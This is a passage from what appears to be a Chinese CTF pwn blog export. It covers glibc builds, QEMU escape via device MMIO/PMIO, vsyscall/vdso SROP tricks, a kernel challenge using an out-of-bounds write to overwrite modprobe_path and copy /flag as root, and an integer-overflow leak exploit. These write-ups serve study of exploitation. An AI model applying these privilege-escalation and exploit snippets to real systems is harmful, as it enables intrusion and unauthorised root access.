*dtv;\n  void *self;       /* Pointer to the thread descriptor.  */\n  int multiple_threads;\n  int gscope_flag;\n  uintptr_t sysinfo;\n  uintptr_t stack_guard;//即为canary，fs:28h处\n  uintptr_t pointer_guard;\n  ...\n} tcbhead_t;\n```\n\n \n\n \n","tags":["pwn-Knowledge"],"categories":["PWN","pwn-Knowledge"]},{"title":"pwn中libc版本切换编译","url":"/2021/08/14/pwn中libc版本切换编译/","content":"\n一、手动编译\n\n1.下载对应libc的源码：以2.32为例：glibc-2.32.tar.gz\n\n(1)官网：https://ftp.gnu.org/gnu/glibc/\n\n(2)清华镜像源：https://mirrors.tuna.tsinghua.edu.cn/gnu/glibc/\n\n2.解压，然后新建文件夹来存储编译结果：\n\n```bash\n#注释头\n\ntar -xvf glibc-2.32.tar.gz\nmkdir glibc-2.32_build\nmkdir glibc-2.32_out\n```\n\n3.编译：\n\n```bash\n#注释头\n\ncd glibc-2.32_build\n../glibc-2.32/configure '--prefix=/home/hacker/glibc/2.32/glibc-2.32_out --disable-werror --enable-debug=yes'\nmake\n```\n\n这里的--prefix=****需要一个绝对路径，不能时相对路径，对于pwn来说就好了，不用再接着往下安装了。不过这是64位的，32位得如下：\n\n```bash\n#注释头\n\ncd glibc-2.32_build\nCC=\"gcc -m32\" CXX=\"g++ -m32\" \\\n../glibc-2.32/configure '--prefix=/home/hacker/glibc/2.32/glibc-2.32_out --disable-werror --enable-debug=yes --host=i686-linux-gnu --build=i686-lin    ux-gnu' \nmake\n```\n\n基本是差不多的。\n\n4.找libc.so 和 ld.so文件：\n\n(1)libc.so 在glibc-2.32_build目录下\n(2)ld.so 在glibc-2.32_build/elf 目录下\n\n5.使用：\n\n```python\n#注释头\n\np = process(['/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so', './pwn'], env={\"LD_PRELOAD\":\"/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6\"})\n```\n\n这样就可以gdb调试的时候带符号表，然后还有源码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_20-51-09.png)\n\n▲关于ld.so的连接使用，最好还是用编译配套的，不然容易出错。如果不需要源码，只需要按照的libc和ld，就可以make install。然后在glibc-2.32_out/lib/下就能找到这两个文件了。\n\n \n\n二、对应docker下载：\n\n1.搜对应版本libc对应的ubuntu，比如libc-2.27就对应ubuntu18.04，然后pull下来。\n\n2.然后将对应版本的docker源sources.list拷贝进去，然后我这边自己总结了一份安装脚本，一键运行，省去很多麻烦。(记得先备份一下，防止出错)\n\n```bash\ndocker cp sources.list [dockerName]:/etc/apt/\ndocker cp install.sh [dockerName]:/\nchmod a+x install.sh\n./install.sh\n```\n\n装完之后基本的环境就有了，pwndbg，python，pwntools等等，其他的自己慢慢安装吧。\n\n▲有个pwn_docker也挺好使的：\n\n```bash\n#注释头\n\ndocker pull pwn_docker\n```\n\n里面运行也类似不同版本的libc:\n\n```python\n#注释头 \np\np = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './pwn'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n```\n\n \n\n三、工具使用：LibcSearcher\n\n这个算是最常用了，很好用，直接去github上找很多，外面也有很多教程。\n\n \n\n四、patchelf：直接修改ELF文件加载的libc\n\n1.安装：\n\n```bash\n#注释头\n\nsudo apt-get install autoconf automake libtool\ngit clone https://github.com/NixOS/patchelf.git\n./bootstrap.sh\n./configure\nmake\nmake check\nsudo make install\n```\n\n编译环境啥的都要有\n\n2.使用：\n\nhttps://github.com/NixOS/patchelf\n\n```bash\n#注释头\n\npatchelf --set-interpreter /home/hacker/glibc/2.23/64/lib/ld-2.23.so --set-rpath /home/hacker/glibc/2.23/64/lib/ ./pwn\n```\n\n这个可以直接gdb调试，不用再用python打开指定环境。\n\n \n\n五、gdb指定源码级别调试：\n\n▲有时候用Patchelf切换之后，想调试对应版本的glibc源码\n\n1.gdb打开后直接命令输入指定：\n\n```bash\n#注释头\n\ndir /home/hacker/glibc-src/glibc-2.23/malloc\n```\n\n2.gdb环境配置输入：\n\n```bash\n#注释头\n\nvim ~/.gdbinit\ndir /home/hacker/glibc-src/glibc-2.23/malloc\n```\n\n但是这有个问题，如果需要对应版本则没办法，只会加载到最下面的版本，所以一般patchelf之后，指定dir即可。\n\n \n\n \n\n","tags":["libc"],"categories":["PWN"]},{"title":"qemu逃逸-pwn解题","url":"/2021/08/14/qemu逃逸-pwn解题/","content":"\n一、内存模块：![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507619.jpeg)\n\n1.可以看到在实际物理内存physical memory中存在qemu进程的内存空间\n\n2.之后在qemu进程的内存空间中虚拟化出虚拟主机的实际内存空间Guest's phy memory。\n\n3.然后才是虚拟主机中各个进程的内存分配。\n\n▲这里可以看到虚拟机中的进程地址都在实际内存地址中有映射，所以如果我们可以找到在虚拟主机中的某个进程对应的实际内存地址，那么一旦满足一定权限要求就可以执行实际内存中qemu进程加载的libc中的内容，从而调用实际内存中的system命令，实现qemu逃逸。\n\n \n\n二、逃逸突破口：\n\n▲qemu逃逸一般是从qemu虚拟化设备的代码中寻找漏洞，但是qemu会虚拟化很多设备，在ctf中一般需要关注的就是题目给的PCI设备。基本上都是把qemu-system-x86用IDA打开，然后从和该设备交互的函数中寻找漏洞。\n\n例如分析题目后知道了某个设备可能就是漏洞设备，这里以BlizzardCTF2017-Strng题目为例，加载了strng设备，那么就用IDA打开qemu-system-x86，然后在函数列表搜索strng，找到对应函数进行分析。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507124.png)\n\n寻找漏洞就需要更多的前置知识了：\n\n1.寻找到设备的代号，方便查看其设备地址空间：\n\n```\n#注释头\n\nubuntu@ubuntu:~$ lspci\n00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)\n00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]\n00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]\n00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)\n00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)\n00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)\n00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)\n```\n\n \n\n这里可以看到00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)，一般标记为unclassified device就是qemu启动时的命令参数中加载进入的设备，也就是strng设备。那么其对应的代号就是00:03.0，之后通过这个代号查询更多内容。\n\n2.查看PCI设备的地址空间，从而方便推断出设备实际申请的内存地址：\n\n(1)通过设备代号，找到该设备的地址空间，可以用以下命令查看：\n\n```\n#注释头\n\nlspci -v -m -n -s 00:03.0\n-------------------------------------------------------------------------\nlspci -v -m -s 00:03.0\n-----------------------------------------------------------------------\nlspci -v -s 00:03.0 -x\n------------------------------------------------------------------------\nhexdump /sys/devices/pci0000\\:00/0000\\:00\\:03.0/config\n```\n\n(2)通过地址空间找到该设备申请的内存空间：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507195.png)\n\n```\n#注释头\n\nubuntu@ubuntu:~$ hexdump /sys/devices/pci0000\\:00/0000\\:00\\:03.0/config\n0000000 1234 11e9 0103 0000 0010 00ff 0000 0000\n0000010 1000 febf c051 0000 0000 0000 0000 0000\n0000020 0000 0000 0000 0000 0000 0000 1af4 1100\n0000030 0000 0000 0000 0000 0000 0000 0000 0000\n```\n\n \n\n这里通过对照，可以知道以上各个参数的实际内容。\n\n(3)然后寻找mmio和pmio的地址，这两个是PCI设备为了与qemu虚拟机进行I/O申请所映射的两块内存。由于qemu模拟设备最终都会与真实的设备进行交互，而qemu中的mmio就是相对于主机下的mmio的一段映射，所以访问这段空间就相当于访问主机下的mmio空间，那么就能跳出qemu，实现qemu逃逸。而PCI设备的大多的读写操作都在这两块内存上，所以针对这两块内存的操作函数通常也是最容易出现漏洞的地方。\n\n①mmio:与内存共享一块地址空间，共用一定数量的地址总线，cpu对该地址空间的访问会直接转化为对设备的访问。\n\n②pmio:与内存分开的，所用的地址总线和内存所用的地址总线不是一样的，cpu访问这块内存时需要使用特殊的指令进行访问。\n\n这两块内存是在BAR(base address register)中，BAR总共6个register，BAR0，BAR1...，每个BAR占据4个字节。而mmio对应BAR0，pmio对应BAR1。\n\n▲结合上图可以看到mmio的地址为0xfebf1000，pmio地址为0xc051。\n\n3.查看PCI设备初始化的函数，寻找漏洞：\n\n(1)首先查看注册strng设备的函数：这里分析可以知道strng_class_init即为初始化函数：\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507927.jpeg)\n\nobject_class_dynamic_cast_assert函数即创建了一个设备，后面的一些操作都是赋值语句，为了初始化该设备。\n\n(2)然后查看strng_instance_init函数，该函数是为了实例化设备，初始化设备的结构体，这个结构体可以在IDA中看到：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507761.jpeg)\n\n函数：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507924.jpeg)\n\n这样可以看到创建了mmio和pmio空间，大小分别为0x100和0x8。\n\n(3)现在查看对这两个空间的操作函数，这才是重点。但是需要注意的是，在这道题目中调用对mmio和pmio进行读写操作的函数时，并没有对mmio或者pmio空间进行读写操作，取而代之的是对reg数组进行读写操作。\n\n▲原因是以下结构体的定义：\n\n```\n//注释头\n\ntypedef struct {\n    PCIDevice pdev;\n    MemoryRegion mmio; //mmio内存空间\n    ......\n} STRNGState;\n\nstatic const MemoryRegionOps strng_mmio_ops = { //mmio空间对应的操作\n    .read = strng_mmio_read, //对mmio空间的read由strng_mmio_read实现\n    .write = strng_mmio_write, //对mmio空间的write由strng_mmio_write实现\n    .endianness = DEVICE_NATIVE_ENDIAN,\n};\n```\n\n原本在c语言中exp的接口函数中为：\n\n```\n#注释头\n\nmmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\n-----------------------------------------------------------------------------\n*((uint32_t*)(mmio_mem + addr)) = value;\n```\n\n对mmio和pmio空间的操作函数就会执行.read和.write函数，但是结构体由于重新将.read函数和.write定位成了strng_mmio_read和strng_mmio_write函数，这个操作某种程度上相当于修改了两个函数的got表。之后就相当于正常的pwn题了，就是利用这几个读写函数中的漏洞，最终执行system(\"cat /root/flag.txt\")即可。\n\n \n\n三、调用mmio_read和mmio_write函数\n\n在strng中，这两个函数就是strng_mmio_read和strng_mmio_write函数。\n\n1.对mmio空间操作，进而调用strng_mmio_read和strng_mmio_write函数：\n\n正常写c语言的exp编译之后，放到qemu中运行，就能通过PCI设备号从而得到mmio地址：/sys/devices/pci0000:00/0000:00:04.0/resource0。然后通过该地址和特定函数就能访问到mmio空间，跳出qemu到主机的mmio空间。\n\n①用户态访问，正常pwn题：\n\n```\n//注释头\n\n#include <assert.h>\n#include <fcntl.h>\n#include <inttypes.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include<sys/io.h>\n\nunsigned char* mmio_mem;\n\nvoid die(const char* msg)\n{\n    perror(msg);\n    exit(-1);\n}\n\nvoid mmio_write(uint32_t addr, uint32_t value)\n{\n    *((uint32_t*)(mmio_mem + addr)) = value;\n}\n\nuint32_t mmio_read(uint32_t addr)\n{\n    return *((uint32_t*)(mmio_mem + addr));\n}\n\n\nint main(int argc, char *argv[])\n{\n\n    // Open and map I/O memory for the strng device\n    int mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/resource0\", O_RDWR | O_SYNC);//这里需要获取到mmio的地址\n    if (mmio_fd == -1)\n        die(\"mmio_fd open failed\");\n\n    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\n    if (mmio_mem == MAP_FAILED)\n        die(\"mmap mmio_mem failed\");\n\n    printf(\"mmio_mem @ %p\\n\", mmio_mem);\n\n    mmio_read(0x128);\n    mmio_write(0x128, 1337);\n\n}\n```\n\n②内核态访问：不太知道有啥用\n\n```\n//注释头\n\n#include <asm/io.h>\n#include <linux/ioport.h>\n\nlong addr=ioremap(ioaddr,iomemsize);\nreadb(addr);\nreadw(addr);\nreadl(addr);\nreadq(addr);//qwords=8 btyes\n\nwriteb(val,addr);\nwritew(val,addr);\nwritel(val,addr);\nwriteq(val,addr);\niounmap(addr);\n```\n\n2.对pmio空间操作，进而调用strng_pmio_read和strng_pmio_write函数：\n\n①用户态访问：\n\n```\n//注释头\n\n#include <sys/io.h >\n\niopl(3);//需要先申请访问端口\ninb(port);\ninw(port);\ninl(port);\n\noutb(val,port);\noutw(val,port);\noutl(val,port);\n```\n\n②内核态访问：也不太清楚有啥用\n\n```\n//注释头\n\n#include <asm/io.h>\n#include <linux/ioport.h>\n\ninb(port); //读取一字节\ninw(port); //读取两字节\ninl(port); //读取四字节\n\noutb(val,port); //写一字节\noutw(val,port); //写两字节\noutl(val,port); //写四字节\n```\n\n3.然后就能调用到qemu中关于mmio和pmio的read，write函数了，从而挖掘漏洞，跳出qemu。\n\n \n\n \n","tags":["qemu题"],"categories":["QEMU"]},{"title":"vsdo和vsyscall的前世今生","url":"/2021/08/14/vsdo和vsyscall的前世今生/","content":"\n一、vsyscall：一般只有ubuntu16.04,libc-2.23中有了。\n\n1.vsyscall的作用：\n\n现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall。\n\n2.vsyscall的特点：\n\n(1)某些版本存在，需要用到gdb来查看，IDA中默认不可见。\n\n(2)地址不受到ASLR和PIE的影响，固定是0xffffffffff600000-0xffffffffff601000。\n\n(3)不能从中间进入，只能从函数开头进入，意味着不能直接调用里面的syscall。这里vsyscall分为三个函数，从上到下依次是\n\n```\n#注释头\n\nA.gettimeofday: 0xffffffffff600000\nB.time:         0xffffffffff600400\nC.getcpu:       0xffffffffff600800\n```\n\n(4)gettimeofday函数执行成功时返回值就是0，保存在rax寄存器中。这就为某些one_gadget创造了条件。\n\n(5)有R,X权限，但是没有W权限，不可写，不能进行shellcode布置。\n\n(6)只有三个系统调用的函数，其余内存都以\"int3\"指令填充。\n\n3.vsyscall的利用：\n\n(1)调整栈帧，下拉rsp：\n\nvsyscall直接进行syscall，并没有利用栈空间，所以在处理栈溢出，但是由于PIE没有别的地址可以用时，而栈上又有某个有用的地址的时候，可以通过vsyscall构造一个rop链来ret，每次ret都会消耗掉一个地址，将rsp下拉一个单位，这样就可以逐渐去贴近想要的那个地址，最后成功ret到相应的位置。\n\n(2)SROP利用：\n\nsyscall ret；指令可用于构造SROP，只需要在其面前放置一个\"pop rax;ret\"的gadget，通过栈溢出将rax赋值为0xf即可调用__kernel_rt_sigreturn，从而打SROP。\n\n \n\n \n\n二、vdso：大多版本用vdso取代了vsyscall\n\n1.vdso作用：\n\n与vsyscall差不多，本来就是为了取代vsyscall用的，不过是通过共享库进行映射，和动态加载有点类似。\n\n2.vdso特点：\n\n(1)vdso的地址随机化的，且其中的指令可以任意执行，不需要从入口开始。\n\n(2)相比于栈和其他的ASLR，vdso的随机化非常的弱，对于32的系统来说，有1/256的概率命中。\n\n(3)不同的内核随机程度不同：\n\nA.较旧版本：0xf76d9000-0xf77ce000\n\nB.较新版本：0xf7ed0000-0xf7fd0000\n\n可利用pwn中Linux知识中的文件来查看具体范围。注意偏移需要更改一下，可以调试查看，一般在200以内。用stack 200，查到的地方除以4之后-2就是偏移，不行就再调试。或者直接pwndbg的fmtarg addr来查看偏移。\n\n▲范围测量：\n\n编译一个打印vdso的程序，编译代码为：\n\ngcc -g -m32 vdso_addr.c -o vdso_addr\n\n如果是64位程序则将m32改成m64即可\n\n```\n#注释头\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    printf(\"vdso addr: %124$p\\n\");//这里的124偏移需要gdb调试进行调整\n    return 0;\n}\n```\n\n然后用脚本即可打印确定范围，将范围调大更加精确：\n\n```\n#注释头\n\nimport os\nresult = []\nfor i in range(100):\n    result += [os.popen('./vdso_addr').read()[:-1]]\nresult = sorted(result)\nfor v in result:\n    print (v)\n```\n\n \n\n3.vdso的利用：\n\n与vsyscall差不多，32位中有现成的__kernel_rt_sigreturn可以打SROP。也可以用gettimeofday来创造rop，绕过PIE，滑过空间。\n\n4.读取靶机的vdso:\n\n(1)如果给了libc，那么根据libc版本使用qemu或者docker创建一个环境，随便运行一个程序，用gdb命令dump下来。(dump memory vdso32.so addr_start addr_end)\n\n(2)如果没给，那么只能先泄露地址再考虑其它。\n\n(3)之后就可以用\n\n```\n#注释头\n\nelf = ELF(“./vdso32.so”)#来加载\nRANGE_VDSO  = range(0xf7ed0000, 0xf7fd0000, 0x1000)\nvdso_addr = random.choice(RANGE_VDSO)\nSROP_kernel_addr = vdso_addr + vdso.symbols['__kernel_rt_sigreturn']\n```\n\n但是这里还是需要加上while循环爆破使用，因为不确定随机化的基地址。\n\n \n\n参考资料：\n\n[https://xz.aliyun.com/t/5236/usr/include/g](https://xz.aliyun.com/t/5236#toc-9)\n\n \n","tags":["vdso"],"categories":["pwn-kernel"]},{"title":"starctf2019-hackme","url":"/2021/08/14/starctf2019-hackme/","content":"\n1.首先解包，看init，空的。\n\n2.然后看启动脚本：\n\n```bash\n#注释头\n\nqemu-system-x86_64 \\\n-m 256M \\\n-nographic \\\n-kernel bzImage \\\n-append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \\\n-monitor /dev/null \\\n-initrd initramfs.cpio \\\n-smp cores=4,threads=2 \\\n-gdb tcp::1234 \\\n-cpu qemu64,smep,smap 2>/dev/null\n```\n\n比较正常，开了smep和smap，并且4内核，2线程，这里就可能会是条件竞争的考点。\n\n3.然后拖入IDA分析：程序比较检查，类似菜单题，但是IDA中F5看伪代码中多了很多的奇怪的参数，最好以add->delete->edit->read的顺序来看比较舒服，一般的堆体分析结构也差不多怎么看。\n\n首先判断下结构体：\n\n```bash\n#注释头\n\ndataStruct:\nidx       4byte\npadding   4byte\ndata_ptr  8byte\ndata_size 8byte\noffset    8byte\n\nstruct chunkNote:\nchunk_addr 8byte\nchunk_size 8byte\n```\n\n其中pool中存储多个chunkNote结构体，不是指针，而是结构体。\n\n(1)add：没什么特别的，创建堆块，拷贝数据，存储chunk到pool中\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-31-32.png)\n\n(2)delete：也没啥问题，释放内存，指针置空。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-36-01.png)\n\n(3)edit：有点问题，这里判断了chunk指针是否存在，并且offset+size要小于等于之前保存的size。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-42-06.png)\n\n本来没啥，但是这里offset和size是int类型，可以为负数，那么就可以依据chunk_addr来向上修改数据了，相当于越界写。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-45-07.png)\n\n(4)read：同样的，也相当于越界读：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_16-46-46.png)\n\n▲虽说是越界写和越界读，但是由于copy系列函数，如果我们想往高地址读写的话，(内核系列函数都在高地址)offset一定需要很大，然后又要满足小于size，那么userDataSize势必要设置为负数，负数转换成unsigned long就会变得很大，基本就会导致一半的空间被覆盖，那么程序指定崩盘，所以这里还是申请pool全局变量处来进行任意读写比较好。\n\n另外也由于slub的特性，简单修改fd的话，虽然能够任意申请，但是如果fd的内存处保存的内容是个非法的，再次申请该大小的chunk程序就会崩，所以有全局变量pool就用pool。\n\n4.思考一下漏洞怎么利用。\n\n(1)首先需要地址\n\n①堆地址：释放chunkA，从chunkB向上偏移读取chunkA的fd，即可得到指向的chunkC的地址，即chunkA.fd = chunkA_addr+size*2。\n\n②内核基地址：依据任意读，从第一个chunk往上的地方读取chunk中的内容，从中筛选出vmlinux中的地址，读取之后减去偏移，即可得到内核基地址。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_17-45-28.png)\n\n例如这里就可以读取图中的0xffffffff81849ae0，然后减去0x849ae0即可得到基地址。当然这没有用kalsr的效果。开了之后如下，偏移也是一样的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_17-51-59.png)\n\n得到这次打开的基地址：0xffffffff9de00000，用命令检查一下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_17-59-38.png)\n\n可以看到最前面的就是内核基地址。\n\n③函数基地址：\n\ncat /proc/kallsyms|grep commit_creds\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_18-12-56.png)\n\n从kallsyms中可以查看到所有函数，减去原始基地址0xFFFFFFFF81000000再加上随机化的内核基地址就是随机化之后的函数地址了。比如上例为：\n\n0xffffffff8104d220-0xFFFFFFFF81000000+0xffffffff9de00000=0xffffffff9de4d220\n\n得到运行了kaslr的函数地址。\n\n④模块基地址：由于需要pool变量地址，所以模块的基地址肯定也需要，这里利用mod_tree来获取。mod_tree包含了所有装载的Mod的基地址。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-03-16.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-03-24.png)\n\n可以看到hackme模块的基地址也包含在里面，开了kaslr之后也是一样的。所以我们利用内核基地址得到mod_tree的地址，申请下来就可以从里面读出hackme模块的基地址。\n\n \n\n(2)然后方法就很多了，虽然开了smep,smap,kaslr：\n\n①修改modprobe_path：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-46-53.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-47-02.png)\n\n可以看到modprobe_path指向一个二进制文件\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-50-56.png)\n\n而当某个特定错误发生时，就会运行该二进制文件，且是以root权限运行的，(我尝试过，运行/bin/sh不能提权)所以如果我们把路径改成我们的二进制文件，将flag复制一下，改下权限就能打开了。(直接cat flag也不行，很奇怪)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-59-15.png)\n\n我们的二进制文件下只能类似是如下命令才行的：\n\n```bash\n#注释头\n\n#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\n\n\n#或者\n#!/bin/sh\n/bin/cat /flag > /home/pwn/flag.txt\n```\n\n注意要使用绝对路径。\n\n▲然后触发这个特定类型的错误需要一个错误格式的二进制文件：\n\n```c\n#注释头\n\nsystem(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /home/pwn/dummy\");\nsystem(\"chmod +x /home/pwn/dummy\");\n```\n\n这个elf的错误格式就是\\\\xff\\\\xff\\\\xff\\\\xff，或者其他错误格式也行。\n\n```c\n#注释头\n\nstrncpy(mem,\"/home/pwn/copy.sh\\0\",18);\nwrite_to_kernel(fd,0xc,mem,18,0);\n\nsystem(\"echo -ne '#!/bin/sh\\n/bin/cp /flag /home/pwn/flag\\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh\");\nsystem(\"chmod +x /home/pwn/copy.sh\");\nsystem(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /home/pwn/dummy\");\nsystem(\"chmod +x /home/pwn/dummy\");\n\nsystem(\"/home/pwn/dummy\");\nsystem(\"cat flag\");\n```\n\n \n","tags":["modprobe"],"categories":["pwn-kernel","Kernel_modprobe"]},{"title":"shadow-IntergerOverflow-Nice","url":"/2021/08/14/shadow-IntergerOverflow-Nice/","content":"\n1.常规checksec，开了NX，FULL RELRO，Canary，没办法shellcode，修改got表。然后IDA打开找漏洞：\n\n(1)整数转换漏洞：\n\n输入message_length之后将长度返回进行atoi，将atoi的返回值给到下一个输入message的getline。中间用atoi进行了一个字符串转int的操作，而atoi是一个将数字型字符串转成数字的函数，”-1”可以转换为-1。但是getline中read的长度参数是size_t，相当于是unsigned int，是一个无符号数。\n\n▲而int的表达方式是：0~2147483647(0~0x7fffffff)  -2147483648~-1(0x80000000~0xffffffff)\n\nunsigned的表达方式是：0~4294967295(0~0xffffffff)\n\n那么int的-1转换成unsigned之后就会变成0xffffffff，从而溢出。\n\n▲由于程序实现了自定义的pop，push，ret，call等几个控制栈帧的汇编代码，所以这里的漏洞不太好找，汇编不太好的只能先慢慢调试验证猜想是否正确。\n\n(2)栈溢出：栈溢出是从整数转换漏洞中来的，由于message是保存在message函数栈上的，所以就如果将read的长度参数变得很大，就可以栈溢出。\n\n▲这里的栈溢出和平常栈溢出有点不同，而且还开了canary，照理说这个栈溢出没什么用，但是这里的Message是一个循环，只要message函数不退出，那么就不会触发canary的检查，就算栈溢出了，那也得等到message函数退出程序才会崩溃。\n\n2.现在只有两个漏洞，但是看程序F5大法啥也看不出来，看汇编吧：\n\n(1)输入name的call getline:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528530.jpeg)\n\n(2)输入长度的call getline:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528677.jpeg)\n\n(3)输入message的call getline:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528431.jpeg)\n\n可以看到，输入message和name的getline中保存数据的参数不一样，\n\n保存name的参数是：[ebp+arg_0]\n\n保存message的参数是：[ebp+var-2c]\n\n再看一下这两个参数的定义：\n\narg_0 = dword ptr  8\n\nvar_2C = byte ptr -2Ch\n\n可以看到name保存在ebp的下方，不在message的函数栈，但是message保存在ebp上方，在message函数栈中。\n\n3.那么现在思考下攻击思路。先输入-1执行栈溢出漏洞，将message函数栈下方的保存name的内容更改为某函数的got表，这样在打印name时就可以将该函数打印出来。\n\n(这里能打印的原因是printf的传参关系，这里能看到，name和message传参所用指令不同：![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528201.jpeg)\n\nname是mov指令，是直接将ebp+arg_0上的内容传给eax\n\nmessage是lea指令，是将ebp+var_2c这个栈地址传给edx\n\n那么显而易见，ebp+arg_0上保存的肯定是一个栈地址，这个栈地址上的内容才是name的真实内容。所以如果我们覆盖ebp+arg_0上的内容为got表，那么再打印就是取got表中的内容打印，也是函数真实地址。)\n\n从而泄露出libc基地址。之后再执行栈溢出，覆盖返回地址为ROP链来getshell。但是这里有一个问题，由于程序自定了某些汇编函数，并且在调试过程中发现用程序的call来调用的函数，返回地址不再是原来call函数的下一句代码，而是一个restore_eip函数。因为在leave和ret指令执行前，执行了call ret，修改了某些东西，导致原本ebp下面不再是函数的返回地址了。并且由于是传指针，就算栈溢出，溢出的也只能是message函数栈，那有canary的情况下，溢出也没有什么意义。但是其它函数返回地址则是直接跳转到ret_stub函数，而这个ret_stub函数是保存在栈上的。\n\n4.这里就想到printf函数，由于name会被打印出来，并且调试可以发现，将name总共16字节顶满后会连上一个17F79D79，之后是两个retn的地址，再之后就是一个栈地址，这几个数据都没有\\x00结束字符，所以可以被printf连在一起打印出来：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528071.jpeg)\n\n那么可以考虑将name顶满后连上ebp泄露出栈地址，之后找到保存read返回地址的栈地址，将写入name的栈地址更改为保存read返回地址的栈地址。之后我们再往name中写东西，就相当于覆盖read函数的返回地址。再经过反复调试，发现read函数返回地址取用的地方刚好是FFF25c3c-0x100，而且每次都是那个地址，那么就可以覆盖了。(这里利用输入message连上ebp也可以泄露出message的ebp上保存的内容，也是相同的栈地址，调试出来的)\n\n5.现在就尝试编写exp:\n\n(1)首先三个函数：\n\n```\n#注释头\n\ndef setName(name):\nio.sendafter('Input name :',name)\n\ndef setMessage(message):\nio.sendlineafter('Message length :','-1')\nio.sendafter('Input message :',message)\n\ndef changeName(c):\nio.sendlineafter('Change name?',c)\n```\n\n(2)通过填满name，泄露一个栈地址：\n\n```\n#注释头\n\nsetName('A'*0x10)\nsetMessage('BBBBBBBBBB')\nsh.recvuntil('<')\nsh.recv(0x1C)\nstack_addr = u32(sh.recv(4))\nchangeName('n')\nlog.info(\"stack_addr:%x\"%stack_addr)\n```\n\n(3)泄露函数真实地址：\n\n```\n#注释头\n\npayload = 'a'*0x34 + p32(atoi_got) + p32(0x100) + p32(0x100)\n#这里第一个p32(0x100)是覆盖getline的读取长度，也就是arg_4，第二个是为了覆盖循环次数，也就是arg_8\nsetMessage(payload)\nsh.recvuntil('<')\natoi_addr = 